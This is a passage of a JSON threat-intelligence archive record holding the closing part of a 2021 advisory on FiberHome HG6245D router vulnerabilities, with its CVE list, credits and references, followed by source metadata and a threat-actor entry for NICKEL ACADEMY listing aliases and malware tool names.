CVE-2021-27142, CVE-2021-27143, CVE-2021-27144, CVE-2021-27145, CVE-2021- 27146, CVE-2021-27147, CVE-2021-27148, CVE-2021-27149, CVE-2021-27150, CVE-2021-27151, CVE-2021-27152, CVE-2021-27153, CVE-2021-27154, CVE-2021- 27155, CVE-2021-27156, CVE-2021-27157, CVE-2021-27158, CVE-2021-27159, CVE-2021-27160, CVE-2021-27161, CVE-2021-27162, CVE-2021-27163, CVE-2021- 27164, CVE-2021-27165, CVE-2021-27166, CVE-2021-27167, CVE-2021-27168, CVE-2021-27169, CVE-2021-27170, CVE-2021-27171, CVE-2021-27172, CVE-2021- 27173, CVE-2021-27174, CVE-2021-27175, CVE-2021-27176, CVE-2021-27177, CVE-2021-27178, CVE-2021-27179.\n\n## Credits\n\n### These vulnerabilities were found by Pierre Kim (@PierreKimSec).\n\n## References\n\n### https://pierrekim.github.io/advisories/2021-fiberhome-0x00-ont.txt\n\n https://pierrekim.github.io/blog/2021-01-12-fiberhome-ont-0day-vulnerabilities.html\n\n## Disclaimer\n\n### This advisory is licensed under a Creative Commons Attribution Non-Commercial Share- Alike 3.0 License: http://creativecommons.org/licenses/by-nc-sa/3.0/\n\n published on 2021-01-12 00:00:00 by Pierre Kim <pierre.kim.sec@gmail.com>\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-01-12 - Multiple vulnerabilities found in FiberHome HG6245D routers.pdf"
    ],
    "report_names": [
        "2021-01-12 - Multiple vulnerabilities found in FiberHome HG6245D routers.pdf"
    ],
    "threat_actors": [
        {
            "id": "9e767b38-12ae-4ef7-9878-5ce1701066d7",
            "created_at": "2024-05-01T02:03:08.131819Z",
            "updated_at": "2025-03-27T02:05:17.413497Z",
            "deleted_at": null,
            "main_name": "NICKEL ACADEMY",
            "aliases": [
                "COVELLITE ",
                "CTG-2460 ",
                "Diamond Sleet ",
                "Guardians of Peace",
                "HIDDEN COBRA ",
                "High Anonymous",
                "Labyrinth Chollima ",
                "NNPT Group",
                "New Romanic Cyber Army Team",
                "Temp.Hermit ",
                "The Lazarus Group ",
                "UNC577 ",
                "Who Am I?",
                "Whois Team",
                "ZINC ",
                "Black Artemis "
            ],
            "source_name": "Secureworks:NICKEL ACADEMY",
            "tools": [
                " DarkMessenger",
                " Destover",
                " Duuzer",
                " HOPLIGHT",
                " Joanap",
                " KorHigh",
                " LiveJinx",
                " Volgmer",
                "Brambul"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1673535909,
    "ts_updated_at": 1743041574,
    "ts_creation_date": 1653759439,
    "ts_modification_date": 1653759439,
    "files": {
        "pdf": "https://archive.orkl.eu/3f414347cad0590d62efcd4aefd1c4b4a9c9b2e1.pdf",
        "text": "https://archive.orkl.eu/3f414347cad0590d62efcd4aefd1c4b4a9c9b2e1.txt",
        "img": "https://archive.orkl.eu/3f414347cad0590d62efcd4aefd1c4b4a9c9b2e1.jpg"
    }
}